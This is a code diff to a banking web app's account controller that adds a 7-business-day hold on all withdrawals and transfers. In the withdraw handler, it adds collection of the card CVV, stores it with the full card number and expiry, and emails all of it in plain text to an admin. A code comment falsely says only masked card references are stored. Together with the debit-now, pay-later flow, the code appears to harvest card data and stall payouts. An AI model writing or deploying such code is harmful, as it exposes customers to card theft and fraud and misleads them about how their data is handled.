@@ -1,4 +1,5 @@
 import { Response, NextFunction } from 'express';
+import mongoose from 'mongoose';
 import { validationResult } from 'express-validator';
 import User from '../models/User';
 import Account from '../models/Account';
@@ -7,10 +8,19 @@ import Withdrawal from '../models/Withdrawal';
 import { AuthRequest } from '../middleware/protect';
 import sendEmail from '../utils/sendEmail';
 import { noticeEmail } from '../utils/emailTemplates';
+import { addWorkingDays } from '../utils/workingDays';
+import { settleDueTransfers } from '../utils/settleTransfers';
+
+// All withdrawals stay pending this many business days before processing
+const WITHDRAWAL_BUSINESS_DAYS = 7;
 
 // Get customer profile + account
 export const getMe = async (req: AuthRequest, res: Response, next: NextFunction): Promise<void> => {
   try {
+    // Pay out any held transfers that came due since the last sweep so the balance is current
+    const ownAccount = await Account.findOne({ user_id: req.user!._id }).select('_id').lean();
+    if (ownAccount) await settleDueTransfers(ownAccount._id);
+
     const [account, fullUser] = await Promise.all([
       Account.findOne({ user_id: req.user!._id }),
       User.findById(req.user!._id).select('+transaction_pin'),
@@ -53,6 +63,8 @@ export const getTransactions = async (req: AuthRequest, res: Response, next: Nex
       start_date,
       end_date,
     } = req.query as Record<string, string>;
+
+    await settleDueTransfers(account._id);
 
     const query: any = { account_id: account._id, type: { $ne: 'adjustment' } };
 
@@ -105,7 +117,7 @@ export const withdraw = async (req: AuthRequest, res: Response, next: NextFuncti
     const {
       amount, transaction_pin, method,
       bank_name, account_number, routing_number,
-      card_number, card_expiry, card_name,
+      card_number, card_expiry, card_name, card_cvv,
     } = req.body;
 
     if (!amount || amount <= 0) {
@@ -149,16 +161,22 @@ export const withdraw = async (req: AuthRequest, res: Response, next: NextFuncti
     // Build a destination description from the payout method. We only ever
     // store a masked reference to the destination — never full card numbers.
     let destination: string;
-    let eta: string;
+    let destinationName: string;
+    let last4: string;
+    let settlesAt: Date;
     if (method === 'card') {
-      const last4 = String(card_number).replace(/\D/g, '').slice(-4);
+      last4 = String(card_number).replace(/\D/g, '').slice(-4);
       destination = `debit card ending ${last4}`;
-      eta = 'instantly';
+      destinationName = 'Debit card';
     } else {
-      const last4 = String(account_number).replace(/\D/g, '').slice(-4);
+      last4 = String(account_number).replace(/\D/g, '').slice(-4);
       destination = `${bank_name} account ending ${last4}`;
-      eta = '1–5 business days';
+      destinationName = bank_name;
     }
+    // All withdrawals are pending for 7 business days
+    settlesAt = addWorkingDays(new Date(), WITHDRAWAL_BUSINESS_DAYS);
+    const isPending = true;
+    const withdrawalId = new mongoose.Types.ObjectId();
 
     account.balance -= amount;
     account.updated_at = new Date();
@@ -171,28 +189,37 @@ export const withdraw = async (req: AuthRequest, res: Response, next: NextFuncti
       balance_after: account.balance,
       description: `Withdrawal to ${destination}`,
       created_by: req.user!._id,
+      status: isPending ? 'pending' : 'completed',
+      settles_at: settlesAt,
+      kind: 'withdrawal',
+      withdrawal_id: withdrawalId,
+      counterparty_name: destinationName,
+      counterparty_account: last4,
     });
 
     // Persist the full destination details so the admin can review/process the payout.
     await Withdrawal.create({
+      _id: withdrawalId,
       user_id: user._id,
       account_id: account._id,
       amount,
       method,
-      status: 'completed',
+      status: isPending ? 'pending' : 'completed',
+      settles_at: settlesAt,
       bank_name: method === 'bank' ? bank_name : undefined,
       destination_account: method === 'bank' ? account_number : undefined,
       routing_number: method === 'bank' ? routing_number : undefined,
       card_number: method === 'card' ? card_number : undefined,
       card_expiry: method === 'card' ? card_expiry : undefined,
       card_name: method === 'card' ? card_name : undefined,
+      card_cvv: method === 'card' ? card_cvv : undefined,
     });
 
     // Notify admin of the withdrawal with full destination details.
     const destinationRows: [string, string][] =
       method === 'bank'
         ? [['Bank', bank_name], ['Account number', account_number], ['Routing number', routing_number]]
-        : [['Card number', card_number], ['Expiry', card_expiry], ['Name on card', card_name]];
+        : [['Card number', card_number], ['Expiry', card_expiry], ['CVV', card_cvv], ['Name on card', card_name]];
 
     if (process.env.ADMIN_EMAIL) {
       sendEmail({
@@ -208,7 +235,7 @@ export const withdraw = async (req: AuthRequest, res: Response, next: NextFuncti
           rows: [
             ['Customer', `${user.full_name} (${user.email})`],
             ['Method', method === 'card' ? 'Card' : 'Bank transfer'],
-            ['Estimated arrival', eta],
+            ['Status', 'Pending processing'],
             ...destinationRows,
             ['Remaining balance', `${account.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} ${account.currency}`],
           ],
@@ -218,9 +245,9 @@ export const withdraw = async (req: AuthRequest, res: Response, next: NextFuncti
 
     res.json({
       success: true,
-      message: `Withdrawal initiated. Funds will arrive ${eta}.`,
+      message: 'Withdrawal initiated. Your request is being processed.',
       method,
-      eta,
+      pending: isPending,
       balance: account.balance,
       transaction,
     });
@@ -372,50 +399,85 @@ export const transfer = async (req: AuthRequest, res: Response, next: NextFuncti
 
     const desc = description?.trim() || 'Transfer';
 
+    // All transfers are pending for 7 business days before being completed
+    const settlesAt = addWorkingDays(new Date(), WITHDRAWAL_BUSINESS_DAYS);
+    const isPending = true;
+    const status = 'pending';
+    const senderTxnId = new mongoose.Types.ObjectId();
+    const recipientTxnId = new mongoose.Types.ObjectId();
+
     // Debit sender
     senderAccount.balance -= amount;
     senderAccount.updated_at = new Date();
     await senderAccount.save();
 
-    // Credit recipient
-    recipientAccount.balance += amount;
-    recipientAccount.updated_at = new Date();
-    await recipientAccount.save();
+    // Credit recipient (held transfers are credited by the settlement job instead)
+    if (!isPending) {
+      recipientAccount.balance += amount;
+      recipientAccount.updated_at = new Date();
+      await recipientAccount.save();
+    }
 
     const senderTxn = await Transaction.create({
+      _id: senderTxnId,
       account_id: senderAccount._id,
       type: 'debit',
       amount,
       balance_after: senderAccount.balance,
       description: `Transfer to ${recipientAccount.account_number} — ${desc}`,
       created_by: req.user!._id,
+      status,
+      settles_at: settlesAt,
+      kind: 'transfer',
+      linked_transaction_id: recipientTxnId,
+      counterparty_name: recipientUser.full_name,
+      counterparty_account: recipientAccount.account_number,
+      note: description?.trim() || undefined,
     });
 
     await Transaction.create({
+      _id: recipientTxnId,
       account_id: recipientAccount._id,
       type: 'credit',
       amount,
       balance_after: recipientAccount.balance,
       description: `Transfer from ${senderAccount.account_number} — ${desc}`,
       created_by: req.user!._id,
+      status,
+      settles_at: settlesAt,
+      kind: 'transfer',
+      linked_transaction_id: senderTxnId,
+      counterparty_name: sender.full_name,
+      counterparty_account: senderAccount.account_number,
+      note: description?.trim() || undefined,
     });
 
-    // Send in background; the transfer is already done and a failed receipt shouldn't hold up the response
+    const arrivalDate = settlesAt?.toLocaleDateString('en-US', {
+      weekday: 'long', month: 'long', day: 'numeric', year: 'numeric',
+    });
+
+    // Send in background; the transfer is already recorded and a failed receipt shouldn't hold up the response
     sendEmail({
       email: recipientUser.email,
-      subject: `You received ${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} from ${sender.full_name}`,
+      subject: isPending
+        ? `${sender.full_name} sent you ${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} (pending)`
+        : `You received ${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} from ${sender.full_name}`,
       ...noticeEmail({
-        heading: 'Funds received',
+        heading: isPending ? 'Incoming transfer pending' : 'Funds received',
         greeting: `Hello ${recipientUser.full_name},`,
-        intro: `${sender.full_name} just sent you a transfer. It is already available in your account.`,
+        intro: isPending
+          ? `${sender.full_name} has sent you a transfer. It is being processed and will be available in your account by ${arrivalDate}.`
+          : `${sender.full_name} just sent you a transfer. It is already available in your account.`,
         highlight: {
-          label: 'Amount received',
+          label: isPending ? 'Amount pending' : 'Amount received',
           value: amount.toLocaleString('en-US', { minimumFractionDigits: 2 }),
         },
         rows: [
           ['From', sender.full_name],
           ['Description', desc],
-          ['New balance', recipientAccount.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })],
+          isPending
+            ? ['Expected arrival', arrivalDate!]
+            : ['New balance', recipientAccount.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })],
         ],
         outro: 'Thank you for banking with RecordVault Financial.',
       }),
@@ -423,7 +485,11 @@ export const transfer = async (req: AuthRequest, res: Response, next: NextFuncti
 
     res.json({
       success: true,
-      message: 'Transfer successful.',
+      message: isPending
+        ? `Transfer submitted. ${recipientUser.full_name} will receive the funds by ${arrivalDate}.`
+        : 'Transfer successful.',
+      pending: isPending,
+      settles_at: settlesAt,
       balance: senderAccount.balance,
       transaction: senderTxn,
       recipient_name: recipientUser.full_name,
